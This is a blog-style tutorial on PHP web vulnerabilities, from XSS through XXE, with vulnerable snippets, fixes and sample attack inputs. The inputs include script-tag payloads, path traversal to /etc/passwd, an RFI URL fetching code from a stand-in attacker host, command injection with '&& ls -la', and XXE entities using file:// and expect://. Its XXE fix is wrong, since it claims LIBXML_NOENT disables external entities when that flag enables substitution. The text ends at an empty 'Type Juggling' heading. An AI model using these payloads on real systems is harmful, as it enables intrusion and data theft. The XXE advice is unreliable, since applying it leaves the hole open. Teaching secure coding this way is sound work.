# <center>PHP beyond SQLi (detailed) - its security, vulnerable code examples & improvement </center>
![image](https://github.com/KiraReys/blog/assets/44244085/8a52accc-7544-490c-858b-5da4b2031fac)


# >> About
PHP is a dynamically typed, server-side scripting language, created in the 1990s. This language has been out for a while, and it's today's standard when someone mentions back-end development for the web.
When PHP was created, one of its most important features was that it could be directly embedded into HTML and create dynamic content, which led to its wide spread in the 2000s. One of the biggest problems for developers
in the early versions of PHP was its Security. Early versions of PHP didn't have that many in-built security features like today, and PHP has improved since then sincerely. A big part of the community still thinks it's the same like it was back then. Blaming PHP when problems arise nowadays because you didn't sanitize user input, handle sessions properly, etc. is clearly a skill issue. In my opinion, even today's community is still way too unaware of the issues that may arise from writing vulnerable code. That is why I am writing this blog; hopefully someone will catch up with more stuff and learn something new. <br>
If someone is wondering why the name of this blog is "PHP beyond SQLi", I just wanted to make a little joke because many developers (I'm talking about those soydevs that blame PHP when it comes to security) today only think about SQL Injection and preparing the statements because they heard they should do that, and maybe they heard about XSS too.

# >> Outline
<ul>
  <li>About</li>
  <li>Popular Bugs</li>
  <ul>
    <li>Cross-Site Scripting(XSS)</li>
    <li>SQL Injection</li>
    <li>Cross-Site Request Forgery(CSRF)</li>
    <li>File Inclusion/Path Traversals</li>
    <li>Server-Side Request Forgery(SSRF)</li>
    <li>Remote Code Execution(RCE) & Command Injection</li>
    <li>Insecure Direct Object References(IDOR)</li>
    <li>XML External Entity(XXE) Injection</li>
  </ul>
  <li>Less Popular Bugs</li>
  <ul>
    <li>Type Juggling</li>
    <li>PHP Object Injection(Insecure Deserialization)</li>
    <li>Integer & Float Overflow/Underflow</li>
    <li>PHP ReDoS</li>
  </ul>
  <li>Conclusion</li>
</ul>

## Cross-Site Scripting(XSS)

We are starting with the easiest one (to understand) and, at the same time, the most common vulnerability that has been really long out there. XSS is an attack in which an attacker injects malicious javascript into the application and it returns it to the users in an unsafe way. If we search for XSS on <a href="https://www.hackerone.com" target="_blank">Hackerone</a>, we can see <i>~2500</i> pages in the results, which is an insane number if you think about it for just one platform. XSS is very underestimated, even today, and can be achieved in various ways. If an attacker finds an XSS on the target application, with the victim visiting the part where the payload is triggered, an attacker can basically do all the actions the victim can do on his own account on the website (e.g, changing victims email address, stealing his private info, steal cookies/stuff in localStorage, etc.). I'll cover the basics here, including dos and don'ts, along with a few examples. <br>
There are three main types/classifications of XSS: Reflected, Stored and DOM XSS. We are only interested in the first two (Reflected and Stored) because the third one happens when the DOM gets manipulated into executing arbitrary JavaScript and it arises in the client-side code, so it's not of our interest. It's very easy to tell the difference between Reflected and Stored XSS, Reflected happens when an attacker injects his payload. We don't handle it appropriately, and it gets now reflected on our website but not stored, unlike in a case of Stored. It's okay if you don't understand; we'll make an easy example here.

![image](https://github.com/KiraReys/blog/assets/44244085/5cc4868e-0758-4c3d-a790-87984186a1c5)

<code>GET /app.php?username=&lt;script>alert()&lt;/script> HTTP/1.1<br>
Host: example.com<br>
Accept: */*<br>
</code>

and then we get something like this in the response:

<code>HTTP/1.1 200 OK<br>
Connection: Keep-Alive<br>
Content-Type: text/html; charset=UTF-8<br><br>
Hello, &lt;script>alert()&lt;/script><br>
</code>

As you may have guessed, in this case it's Reflected XSS. It's not getting saved somewhere, so there is no way for it to be <u>persistently</u> there (fun fact: the other name for Stored XSS is Persistent XSS, hopefully it makes more sense that way).<br> Ok now, let's fix that now by using <code>htmlspecialchars()</code> function which is used to handle the user supplied input properly and transfer the special characters to <a href="https://www.freeformatter.com/html-entities.html">Html entities</a>.

![image](https://github.com/KiraReys/blog/assets/44244085/79083ec5-fd89-4ede-a12f-2a5e44329c53)<br>

The response will look like this now:

<code>HTTP/1.1 200 OK<br>
Connection: Keep-Alive<br>
Content-Type: text/html; charset=UTF-8<br><br>
Hello, &#38;lt;script&#38;gt;alert()&#38;lt;/script&#38;gt;<br>
</code>

Now there is no way to inject a new tag or escape something, for example, if the user-supplied input is reflected like this:
<code>
&lt;input value="USER_SUPPLIED_INPUT">
</code>
An Attacker may try to escape it with double quotes
<code> 
&lt;input value="" MALICIOUS"> 
</code> 
but that won't work because the double quotes are escaped too. <br>
Vanilla PHP is not frequently used today for new projects, but PHP frameworks like Laravel or Symfony are go-to, so we will make few examples with Laravel too. What's important when using laravel is to always use built-in echo method by blade templates on user supplied input, because blade templates render it as plain text and it's secure. You are probably asking yourself now, when is the XSS stored? <br>
It's simple, there must be some kind of storage (to a database, as some file, e.g.), and then later the victim receives that malicious data. The point of the story is to always properly handle the user-supplied input. <br> 
The most simple example for Stored XSS is a Social Media Application with the functionality to create a new post with a <i>title</i> and <i>content</i>.

<code>POST /app.php HTTP/1.1<br>
Host: example.com<br>
Content-Type: application/x-www-form-urlencoded<br><br>
title=&lt;script>alert()&lt;/script>&content=test<br>
</code>

In this case the <i>title</i> parameter is vulnerable to XSS. That post stays forever there, and it has way more impact because now the attacker doesn't have to lure the victim to visit his link and it stays. That's why normally Stored XSS is ranked "High" severity vulnerability and Reflected "Medium".
<br>
Another thing I want to cover is the javascript-pseudo protocol. We have normal protocols like <code>http:</code>, <code>ftp:</code>, but we also have so-called pseudo protocols related to the app and not the network, like <code>javascript:</code>. Why is it important? It's important because we can execute arbitrary javascript and achieve XSS of course. <br>
Everywhere where an user can supply a link to the application and the link gets returned/stored it can be vulnerable to this attack. <br><code>javascript:alert()</code> - simple payload to test this. If you want to see how this can look like, you can read <a href="https://hackerone.com/reports/1930763" target="_blank">this</a> report on HackerOne. It's also important to cover this on the part of the app where you allow the user to supply HTML and nothing else. This attack can be achieved using certain event-handlers on these html tags: <code>a</code>, <code>iframe</code> and <code>form</code>. <br>
Most of the vulnerabilities appear from the user input, and it's because developers are not careful with it, and after some time they forget it, so they write whatever-like code. 
<br>
It's always important to keep track of it, and yeah, you may have written secure code in 10 places where that input was used, but probably there is some other place you just forgot. This doesn't only apply to XSS but to most of the vulnerabilities I will mention in this blog. <br>
Now let's get back to the Reflected XSS, if you thought a bit about it, you could've came to a conclusion that it can only happen using GET request. Well, yes and no, if we have Reflected XSS via POST or some other req-method it will be considered as "Self-XSS", an attack where you, yourself must do some certain actions to execute javascript, not really impactful you may think. If you don't have proper CSRF protection (which we will talk later about in this blog), then it can actually be escalated to impactful POST-Based Reflected XSS. (you can escalate so-called "Self-Stored XSS's" this way too)<br> <br>
Let's take this as example:<br>

![image](https://github.com/KiraReys/blog/assets/44244085/5e6e4b9b-4481-4565-8655-c7dec3be4558)<br>

As you can see, there is no "CSRF-Token" in the HTML form or somewhere else, so it's possible to do a simple CSRF attack like this:<br><br>
![image](https://github.com/KiraReys/blog/assets/44244085/77b6ea0f-f92a-4659-bf14-20c193821d9f)<br>

We are using this code snippet and hosting it on our own website, and then all we have to do is lure the victim to visit our website, the POST request will be sent and the malicious javascript executed.

If you're using Laravel with Blade Template Engine, use the built-in blade echo's or <code>htmlspecialchars()</code> like above and it'll be covered as plaintext. <br>
If you want to dynamically use user-supplied URL, you can use <code>urlencode()</code> function that'll cover it for you and do proper <a href="https://en.wikipedia.org/wiki/Percent-encoding" target="_blank">URL Encoding</a>.<br>
<code>urlencode("http:&#x2f;&#x2f;example.com");</code> -> <code>http%3A%2F%2Fexample.com</code> <br>

That'll be it for XSS, there is a loooooot more, you can't imagine how much there is to it but that's just basics of basics and that's good for starters 😀.
<br><br>
## SQL Injection(SQLi)

Okay, let's talk now about the most popular one among community. I won't talk too much about SQLi, as it's already very well-known issue and it's not something hard to understand. I think most people reading this blog know what SQLi is, but for those who don't, shortly; it's a vulnerability that allows an attacker to inject their own SQL and interact with the database of the application. We'll start by using these three code snippets as examples, and all three have different scenarios.<br>

<b><u>DON'TS</u></b><br>

![image](https://github.com/KiraReys/blog/assets/44244085/dfa2d8a5-f563-4276-b3ec-f831c7bb90c2)<br>
or <br>
![image](https://github.com/KiraReys/blog/assets/44244085/f147b494-ce6c-4155-919c-e44e1a5634b5)<br>
and<br>
![image](https://github.com/KiraReys/blog/assets/44244085/03c6ebea-6779-4060-88a3-945baaae300a)<br>
<br>
<b><u>DO IT LIKE THIS</u></b><br><br>
![image](https://github.com/KiraReys/blog/assets/44244085/76fed0d8-7eca-42e4-847a-6f77c375f83e)<br><br>

The first two examples are similar; in the first one, it's chained in the variable, and in the second one, it's passed directly into the string. The third example is vulnerable even though <code>prepare()</code> is used.
You should never pass it directly(in a case it's an user-controllable input); you must bind the parameters, like in the last example.
<br>
In my opinion, the two most important "divisions" of SQLi to understand Imo are Second-Order SQLi and Blind SQLi.
Second-Order SQLi is very similar to Stored XSS; it's when the application takes the user-supplied input (btw, if there was an issue, it would be First-Order SQLi, but that's not how it's called because it's the classical one; look at the example above), stores that for later use, and then later, when it's used and handled by other HTTP requests, it's handled wrong, and the issue occurs there. 
<br>
Blind SQLi, as its name says, is a situation where the part of the application that's vulnerable to SQLi doesn't return any relevant response from the database for the SQL Query, so it's not easy to know if that part of the app is actually vulnerable. Typically, these SQLi's are a bit harder to exploit, but not impossible. There are techniques out there to exploit these cases too.<br><br>

## Cross-Site Request Forgery(CSRF)

This vulnerability has been less and less seen in the wild through the years, but nevertheless, it's still there. Cross-Site Request Forgery is a security vulnerability that allows an attacker to perform some actions from some other source that the victim does not intend to perform. Here's an example for that: <br>

- <code>POST /bank/transfer-funds.php HTTP/1.1<br>
Host: example.com<br>
Content-Type: application/x-www-form-urlencoded<br><br>
amount=100&to=example@example.com<br>
</code>
<br>

- There is no CSRF Protection (for example, an anti-CSRF token), so it's possible to send the POST request from the attacker's hosted website.<br>

![image](https://github.com/KiraReys/blog/assets/44244085/6ab84f2c-1a89-48cb-82c8-b52506134b65)<br>
- The attacker lures the victim to the website, and there you have that Cross-Site action. Funds are transferred to the attacker's account 💰. <br><br>

That was the classic example. Of course, all relevant and sensitive actions should be secured against CSRF, like: changing email addresses, adding stuff to carts, deleting accounts, etc. CSRF on some of the actions can be really critical, like, for example, changing an email address, which leads to direct <a href="https://www.cloudflare.com/learning/access-management/account-takeover/" target="_blank">account takeover</a> via the "Forget Password" function. 
<br><br>
This issue is not something hard to fix, it's actually quite simple. Use the Anti-CSRF tokens and if you don't have a problem with restricting the cookies from Cross-Site requests, then you could also enforce the <a href="https://owasp.org/www-community/SameSite" target="_blank">SameSite</a> attribute to cookies. It's essential to use the Anti-CSRF tokens but also to do proper checks for them, which many developers, from what I have seen, miss out on. These are the questions you should ask yourself, and later check the code: <br>

- Is the Anti-CSRF there in the request?
- Is it the right Anti-CSRF token for that user?
- Is the Anti-CSRF token somehow spoofable?

<br>
CSRF vulnerabilities are really underrated; personally, I would say they're one of the most used vulnerabilities to create chains of vulnerabilities that have greater impacts. Even CSRFs on some functionalities like login/log-out, changing some preferences on an account, etc. can really be of help for an attacker; that's why it's important to keep all of it secure.<br>
An example for this is let's say you have a Self-XSS on your account, what you can do is: <br>

- Attacker visits your link
- Log-Out CSRF
- Login CSRF to your account<br>

From that, you can create a very nice phishing attack, like <i>We are sorry, could you re-login here</i>...<br><br>

## File Inclusions/Path Traversals

Next on the list are RFI/LFI and Path Traversals. File Inclusions are mostly found in PHP applications; they are the result of using <code>include()</code> and <code>require()</code> function incorrectly. People sometimes can't make the difference between those two similar vulnerabilities (LFI and RFI). That's okay, because here I'll try to explain it with some easy examples. 
The easiest way to explain it:<br>
When an attacker is exploiting RFI, he uses a remote file, while on the other side, LFI uses local files when they are attacking servers; even the name of the vulnerability tells you that. While exploiting LFI you can get response from the local system files, for example <code>/etc/passwd</code> or <code>/etc/shadow</code>.<br>
<code>http://localhost/app.php?file=/etc/passwd</code>

On the other hand, while exploiting RFI you can upload files from a remote server which in 99% of the cases will result in RCE(Remote Code Execution). Nowadays it's very rare to see RFI in the wild, because including files from remote location is disabled in PHP by default (<code>allow_url_include</code>).
Example for RFI: <code>http://localhost/app.php?file=http://attackers.website.com/somemaliciousfile</code>. You could execute malicious code from the <code>somemaliciousfile</code> file and use it for malicious intention. <br>

Take this one-liner for example: <code>&lt;?php include $_GET['file']; ?&gt;</code><br>
An attacker now can make us of additional trailing slashes and dots to access some sensitive file, like this: <br>
<code>http://localhost/app.php?file=fileYouShouldSee.php</code><br>
<code>http://localhost/app.php?file=../../secret</code><br>

You may be thinking now, How can I protect against something like this? Well, it depends on the situation, but the first thing you should consider is to rethink: do you need to execute that file or do you just need the content inside of it? If not, then you can use the <code>readfile()</code> function. It's only displaying the contents of the file and not executing it. This way, you are making escalation of the issue to some server-side injection very less likely.

Here's an example with <code>readfile()</code>,
this is your directory:

- index.php
- test.php

<u>index.php</u>:
<code>
&lt;?php
    readfile($_GET['file']);
?>
</code><br>
<u>test.php</u>:
<code>
&lt;?php 
    echo "&lt;strong>Test&lt;/strong>";
?>
</code><br><br>
Now when you send this request to the server <code>http://localhost/?file=test.php</code> it will just reply with the content of the file <code>test.php</code> and it will not actually interpret the code:<br>
![image](https://github.com/KiraReys/blog/assets/44244085/3bb3a30f-34c1-4ef0-93b6-3b77797c3c62)<br>

Now this is what <strong>Path Traversal</strong> is, you can read the contents of the files and obtain some sensitive information from the files you shouldn't be able to see, but not execute them. It's like a lower-grade LFI. You can fix that now by using <code>basename()</code> and <code>realpath()</code> functions. <br>
<code>basename()</code> function returns the base name of a file if the path of the file is provided as a parameter to the basename() function, e.g<br>
<code>/home/test/asdf.txt</code> -> <code>asdf.txt</code><br>
<code>realpath()</code> function returns the absolute pathname of the file and removes the additional <code>../</code>, <code>./</code>, e.g, which are used to often to exploit the vulnerability.<br>
<code>../test.txt</code> -> <code>/home/test/test.txt</code><br>
When you combine those two, it should look like this now:
<code>&lt;?php readfile(basename(realpath($_GET['file']))); ?></code>, now if someone provides something like <code>../../../etc/passwd</code> it will first remove all the <code>../</code> and give the absolute pathname which is <code>/etc/passwd</code>, after that <code>basename()</code> function will just save it as <code>passwd</code> and that is what we want.
Now the attacker will only be able to read the files in that same directory, and you can make a simple check for that, if there are any sensitive files there.<br><br>

## Server-Side Request Forgery(SSRF)

In contrast to CSRF, SSRF is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location, it's mostly some internal service on the app which normal user has no access too. We'll start with this code example: <br>
![image](https://github.com/KiraReys/blog/assets/44244085/5449ce78-2c82-459c-be81-46c0ae8fa9dd)

As you can see, there is a straightforward user-supplied URL to load the picture from another location. An attacker can do something like this now <code>http://example.com/?image=http://localhost/admin</code> hit the localhost and exploit it further. Also what's characteristic for this vulnerability is ability to try out different protocols like: <code>ftp://</code>, <code>file://</code>, <code>gopher://</code>, e.g <code>http://example.com/?image=file://etc/passwd</code>. <br>
There is a whole other classification of SSRF, which is called Blind SSRF. As the name says, it's blind, meaning that we can't see the response (the result of the endpoint we are hitting) but we are hitting it. These types of SSRF's have a lower impact and are mostly used to scan open ports on the target machine, DoS... <br><br>

SSRF is not as easy to fix as the previous vulnerabilities we talked about; there's not a certain function to fix it. The best would be if the application wouldn't allow users to provide URLs, but if the application must work like that, then there are other ways to prevent that. You can try "whitelisting" stuff, which means adding certain URLs and locations that are allowed to be supplied and everything else is not. While we are at it, almost never do "blacklisting" (its meaning is opposite of whitelisting,  those things that you list are forbidden and everything else isn't) to try to fix any of these vulnerabilities, because almost always sooner or later a bypass will be found for that. An extra step of taking care is not accepting other protocols/schemas than the ones needed.

If you've paid attention to this blog, you may be able to guess which vulnerability is present in that picture above, aside from SSRF. If you've guessed XSS, that's correct. In this case, an attacker can just upload <code>.html</code> file with his malicious client-side code and send it like this <code>http://example.com/?image=http://attacker.com/evil.html</code><br><br>

## Remote Code Execution(RCE) & Command Injection

People mix these two vulnerabilities many times because of their similarities; it doesn't really matter because when you have one, you can have another almost always if you want. These two are at the top of the pyramid and the most important ones to be fixed with the biggest impact. By their names you can figure out, RCE is a vulnerability which allows an attacker to run arbitary code on victims machine and Command Injection is a vulnerability which allows an attacker to execute OS commands on victims machine. <br>

![image](https://github.com/KiraReys/blog/assets/44244085/312a4255-34e3-4173-b5db-200e68d9e9dd)
<img src="https://github.com/KiraReys/blog/assets/44244085/cf7ea462-d7a7-433e-a1b7-6f0553adc7cf" height=232 alt="image">

There are way more complex examples for both Command Injection & RCE, but these two are the most simple ones. Avoid using dangerous functions like <code>eval()</code>, <code>system()</code>, <code>shell_exec()</code> etc.
on user input, and if you really have to use it on user provided input, make sure to escape it properly. If you know basics of Shell in Linux then you may guess how that can be escaped on the first example. <br><br>First Example Exploit: <code>http://example.com/?q=asdf%20&&%20ls%20-la</code><br>
Second Example Exploit: <code>http://example.com/?q=system("ls%20-la");</code><br>
<strong>%20 = SPACE URL-ENCODED</strong><br><br>

Like I've said, there are a lot more ways to achieve RCE or Command Injection, e.g., File upload, where an attacker can upload <code>.php</code> somewhere and have the HTTP server execute it when we visit that location, but covering all that would take ages here to explain tenderly.
What's important for these two is to have other server-side issues fixed, because in most cases, when we see RCE or Command Injection, it's not directly but actually escalated from another issue.<br><br>

## Insecure Direct Object References(IDOR)

IDOR is a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. It's one of the easiest to understand, and it's been very popular lately. <code>http://example.com/account/54433/edit</code> This is the easiest example. Let's say <code>54433</code> is our account ID. If there is no protection, an attacker can just change the ID to someone else's and then edit information on the victim's account. That would be the case of an IDOR.
<br><br>
Of course, the IDs don't always have to be integers, they can be any text, so it's improtant to look everywhere when you're looking for these vulnerabilities. I'll make one more complex example here. Let's say this is a request where you purchase an item from the online store.<br>

 <code>POST /store/purchase-item.php HTTP/1.1<br>
Host: example.com<br>
Content-Type: application/x-www-form-urlencoded<br><br>
item_id=3234&account_id=54433<br>
</code>
<br>
Try to guess alone what an attacker could do here 🤔. If you've said to change the account ID to someone else's, good job. By changing to someone else's ID, it charges $ from the victim's account and that is a serious issue that can be abused. <br><br>
How IDORs can be prevented in PHP is very simple, you just have to ensure that access control checks are implemented in the code to verify that the user has permission to access the requested resource and if not just send back 403 response code(<code>http_response_code(403);</code>). Of course it's easy to say that, because in many places it can be easily overlooked and later become an issue, but that's why pentest services exist and if your website is very important for you, I would really recommend it to you.

## XML External Entity(XXE) Injection

This one is only improtant for you if you use XML to transmit data on the API somewhere. These are very important to fix because they lead to server-side injection/exposure actions and are almost always critical. <br>
XXE Injection arises when an application processes XML input and allows the inclusion of external entities, which can be exploited by attackers to read local files, perform SSRF, or execute other malicious actions.
Here is an example, let's say you have this request: <br>

<code>POST /account HTTP/1.1<br>
Host: example.com<br>
Content-Type: application/xml<br><br>
&lt;?xml version="1.0" encoding="UTF-8"?><br>
  &lt;user><br>
      &lt;id>54433&lt;/id><br>
  &lt;/user><br>
</code><br>

What an attacker can do is:<br>
<code>POST /account HTTP/1.1<br>
Host: example.com<br>
Content-Type: application/xml<br><br>
&lt;?xml version="1.0" encoding="UTF-8"?><br>
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  &lt;user><br>
      &lt;id>&xxe;&lt;/id><br>
  &lt;/user><br>
</code>

This way an attacker exposed the <code>/etc/passwd</code> from the server, which is obviously bad. Also an attacker can achieve SSRF this way:<br>
<code>
  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://localhost/"> ]>
</code><br>
or Command Injection with the help of <a href="https://www.geeksforgeeks.org/protocols-and-wrapper-in-php/" target=_blank>PHP Wrappers</a> this way:<br>
<code>
  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "expect://id"> ]>
</code><br><br>
 There are other ways to exploit this security vulnerability, but these are the most popular ones. XXE Injection is not really seen often, but it's still very important to secure the spots of the app that use XML data processing.
To fix this vulnerability, I would suggest you validate the user input, make sure it's in the expected format, and disable external entity loading. You can disable external entity loading by using the <code>LIBXML_NOENT</code> flag in the <code>loadXML(YOUR_XML, LIBXML_NOENT);</code> function.<br><br>

## Type Juggling
